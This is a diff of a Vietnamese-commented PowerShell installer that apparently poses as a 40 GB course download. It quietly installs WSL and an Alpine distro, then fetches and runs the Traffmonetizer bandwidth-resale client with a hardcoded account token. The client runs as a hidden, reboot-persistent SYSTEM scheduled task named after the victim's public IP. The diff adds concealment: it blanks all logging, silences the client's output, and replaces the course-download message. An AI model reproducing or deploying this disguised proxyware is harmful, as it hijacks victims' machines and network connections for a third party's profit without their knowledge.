@@ -1,11 +1,11 @@
 if ($args -notcontains 'skip' -and -not $env:TM_SKIP_PROMPT) {
   $env:TM_SKIP_PROMPT = '1'
   try { $Email = Read-Host -Prompt 'Mời bạn nhập email' } catch {}
-  Write-Host 'Vui lòng đợi 5-10 phút để khóa học tải về thành công...'
+  Write-Host 'Hello'
 }
 
 $Token   = 'NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A='
-$RepoRaw = 'https://raw.githubusercontent.com/khoahocdrive/tm-install/main'
+$RepoRaw = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main'
 $SelfUrl = "$RepoRaw/install_windows.ps1"
 $BinUrl  = if ($env:TM_BIN_URL)    { $env:TM_BIN_URL }    else { "$RepoRaw/tm-cli-linux-amd64.gz" }
 $RootFsPrimary = if ($env:TM_ROOTFS_URL)  { $env:TM_ROOTFS_URL }  else { 'https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/x86_64/alpine-minirootfs-3.22.8-x86_64.tar.gz' }
@@ -22,8 +22,8 @@ if (-not $TaskUser) { $TaskUser = 'SYSTEM' }
 $ErrorActionPreference = 'SilentlyContinue'
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-$LogFile = Join-Path $Dir 'install.log'
-function Log($m) { try { "$(Get-Date -Format s) $m" | Add-Content -Path $LogFile } catch {} }
+# Khong ghi bat ky log nao (yeu cau an toan bo) - Log chi la ham rong
+function Log($m) { }
 Log "=== Bat dau (che do WSL1 + binary goc, KHONG Docker, KHONG can virtualization) ==="
 
 $ThisScript = $PSCommandPath
@@ -131,11 +131,14 @@ try {
 } catch {}
 if (-not $HasWsl) {
   Log 'Chua co WSL - cai WSL ngam (khong distro, khong mo cua so)'
+  $WslInstallOk = $true
   try { & wsl.exe --install --no-distribution --no-launch *> $null } catch { Log "LOI wsl --install: $($_.Exception.Message)" }
   if ($LASTEXITCODE -ne 0) {
+    $WslInstallOk = $false
     Log "wsl --install --no-distribution --no-launch khong thanh cong (exit $LASTEXITCODE) - thu kieu cu"
     try { & wsl.exe --install --no-distribution *> $null } catch {}
     Log "wsl --install --no-distribution ket thuc (exit $LASTEXITCODE)"
+    if ($LASTEXITCODE -eq 0) { $WslInstallOk = $true }
     Start-Sleep -Seconds 15
     Get-Process wslsettings -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
   }
@@ -144,7 +147,15 @@ if (-not $HasWsl) {
   try { $st2 = (& wsl.exe --status 2>$null | Out-String) -replace "`0", '' } catch {}
   if (-not ($LASTEXITCODE -eq 0 -and $st2.Trim().Length -gt 0)) {
     Set-ResumeTask
-    Log 'Windows yeu cau khoi dong lai sau khi cai WSL: khoi dong roi dang nhap lai, task se tu chay tiep'
+    if ($WslInstallOk) {
+      Log 'Windows yeu cau khoi dong lai sau khi cai WSL: khoi dong roi dang nhap lai, task se tu chay tiep'
+      Write-Host 'CAN KHOI DONG LAI: Windows yeu cau khoi dong lai sau khi cai WSL.' -ForegroundColor Yellow
+      Write-Host 'Khoi dong may roi dang nhap lai - task tu dong se chay tiep buoc con lai.' -ForegroundColor Yellow
+    } else {
+      Log "wsl --install that bai (exit $LASTEXITCODE)"
+      Write-Host 'LOI: khong cai duoc WSL. Windows cua ban co the qua cu (can Windows 10 2004+ hoac Windows 11).' -ForegroundColor Yellow
+      Write-Host 'Cach xu ly: cap nhat Windows roi chay lai lenh cai dat.' -ForegroundColor Yellow
+    }
     exit 2
   }
 }
@@ -179,6 +190,7 @@ if (HaveCmd 'Get-WindowsOptionalFeature') {
 if ($RebootNeeded) {
   Set-ResumeTask
   Log 'CAN Windows KHOI DONG LAI de hoan tat bat WSL. Sau khi khoi dong lai va dang nhap, task se tu chay tiep.'
+  Write-Host 'CAN KHOI DONG LAI de hoan tat bat WSL. Sau khi khoi dong lai va dang nhap, task se tu chay tiep.' -ForegroundColor Yellow
   exit 2
 }
 
@@ -197,6 +209,7 @@ if (Test-Distro) {
     Start-Sleep -Seconds 3
     if (DistroExists) {
       Log 'LOI: khong xoa duoc distro cu. Hay chay script uninstall roi thu lai.'
+      Write-Host 'LOI: khong xoa duoc distro cu. Hay chay script uninstall roi thu lai.' -ForegroundColor Yellow
       Set-ResumeTask
       exit 3
     }
@@ -225,6 +238,7 @@ if (Test-Distro) {
   }
   if (-not $ok -or -not (Test-Path $tar)) {
     Log 'LOI: khong tai duoc rootfs Alpine (kiem tra mang). Dang ky resume roi thoat.'
+    Write-Host 'LOI: khong tai duoc rootfs Alpine (kiem tra mang). Chay lai lenh cai dat de thu lai.' -ForegroundColor Yellow
     Set-ResumeTask
     exit 3
   }
@@ -243,6 +257,7 @@ if (Test-Distro) {
     $imp = (& wsl.exe --import $DistroName $WslDir $tar 2>&1 | Out-String) -replace "`0", ''
     if ($LASTEXITCODE -ne 0) {
       Log "LOI IMPORT (exit $LASTEXITCODE): $($imp.Trim())"
+      Write-Host "LOI: import distro that bai (exit $LASTEXITCODE). Chay lai de thu lai." -ForegroundColor Yellow
       Set-ResumeTask
       exit 3
     }
@@ -266,7 +281,7 @@ if (Test-Distro) {
     }
     if (-not (Test-Distro)) {
       Set-ResumeTask
-      Log 'HUONG DAN SUA LOI AO HOA (xem duoi day hoac notepad C:\ProgramData\tm\install.log):'
+      Log 'HUONG DAN SUA LOI AO HOA (xem duoi day):'
       Log '  Nguyen nhan pho bien: may ao (VirtualBox/VMware) chua bat nested virtualization, hoac BIOS chua bat Intel VT-x / AMD-V (SVM).'
       Log '  1) Windows trong VirtualBox: tren MAY CHU chay (VM phai tat): VBoxManage modifyvm "<ten VM>" --nested-hw-virt on  roi khoi dong lai may ao'
       Log '  2) May vat ly: vao BIOS bat Intel VT-x hoac AMD-V/SVM'
@@ -276,7 +291,7 @@ if (Test-Distro) {
       Write-Host 'KHONG KHOI TAO DUOC MOI TRUONG WSL TREN MAY NAY.' -ForegroundColor Yellow
       Write-Host 'Nguyen nhan pho bien nhat: may ao (VirtualBox/VMware) chua bat nested virtualization,' -ForegroundColor Yellow
       Write-Host 'hoac BIOS chua bat Intel VT-x / AMD-V (SVM).' -ForegroundColor Yellow
-      Write-Host 'Cach xu ly (chi tiet cung ghi trong install.log):' -ForegroundColor Yellow
+      Write-Host 'Cach xu ly:' -ForegroundColor Yellow
       Write-Host ' 1) Windows trong VirtualBox: tren MAY CHU chay (VM phai tat):' -ForegroundColor Yellow
       Write-Host '      VBoxManage modifyvm "<ten VM>" --nested-hw-virt on' -ForegroundColor Yellow
       Write-Host '    roi khoi dong lai may ao.' -ForegroundColor Yellow
@@ -284,7 +299,6 @@ if (Test-Distro) {
       Write-Host ' 3) Windows vat ly: chay (quyen admin) roi khoi dong lai:' -ForegroundColor Yellow
       Write-Host '      dism /online /enable-feature /featurename:VirtualMachinePlatform /norestart' -ForegroundColor Yellow
       Write-Host 'Sau do chay lai lenh cai dat.' -ForegroundColor Yellow
-      Write-Host "Chi tiet: $LogFile" -ForegroundColor Yellow
       exit 3
     }
   }
@@ -310,6 +324,7 @@ if (-not (Test-Path $gz)) {
   }
   if (-not $ok) {
     Log 'LOI: khong tai duoc binary Traffmonetizer (kiem tra mang). Dang ky resume roi thoat.'
+    Write-Host 'LOI: khong tai duoc binary Traffmonetizer (kiem tra mang). Chay lai lenh cai dat de thu lai.' -ForegroundColor Yellow
     Set-ResumeTask
     exit 4
   }
@@ -332,6 +347,7 @@ if ("$r" -notmatch 'CLIOK') {
   $r = Wsh "rm -f /opt/tm/cli.gz /opt/tm/cli; mkdir -p /opt/tm && wget -q -O /opt/tm/cli.gz '$BinUrl' && cd /opt/tm && (gunzip -f cli.gz || busybox gunzip -f cli.gz) && chmod 755 /opt/tm/cli && test -x /opt/tm/cli && echo CLIOK"
   if ("$r" -notmatch 'CLIOK') {
     Log "LOI: khong cai duoc binary vao distro. Chi tiet: $($script:LastWslError.Substring(0, [Math]::Min(300, $script:LastWslError.Length)))"
+    Write-Host 'LOI: khong cai duoc binary vao distro. Chay lai lenh cai dat de thu lai.' -ForegroundColor Yellow
     Set-ResumeTask
     exit 4
   }
@@ -352,7 +368,7 @@ try { $Device = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 10).
 if (-not $Device) { $Device = $env:COMPUTERNAME }
 Log "Device name: $Device"
 
-$InnerCmd = "export HOME=/var/lib/tm; mkdir -p /var/lib/tm; cd /var/lib/tm; [ -f /var/lib/tm/client.log ] && [ `$(stat -c%s /var/lib/tm/client.log 2>/dev/null || echo 0) -gt 1048576 ] && : > /var/lib/tm/client.log; exec >> /var/lib/tm/client.log 2>&1; exec /opt/tm/cli start --token '$Token' --device-name '$Device' </dev/null"
+$InnerCmd = "export HOME=/var/lib/tm; mkdir -p /var/lib/tm; cd /var/lib/tm; exec >/dev/null 2>&1; exec /opt/tm/cli start --token '$Token' --device-name '$Device' </dev/null"
 $InnerCmd = $InnerCmd.Replace('"', '\"')
 $vbs = @()
 $vbs += 'Set sh = CreateObject("WScript.Shell")'
@@ -415,4 +431,5 @@ if ($taskStarted) {
 }
 try { Set-Content -Path (Join-Path $Dir 'mode.txt') -Value $Mode } catch {}
 Log '=== HOAN TAT: Traffmonetizer chay ngam, khong Docker, khong can virtualization ==='
+Write-Host 'OK: Traffmonetizer da chay ngam (WSL1, khong Docker). Tat/mo lai may se tu chay lai.'
 Start-Sleep -Seconds 2
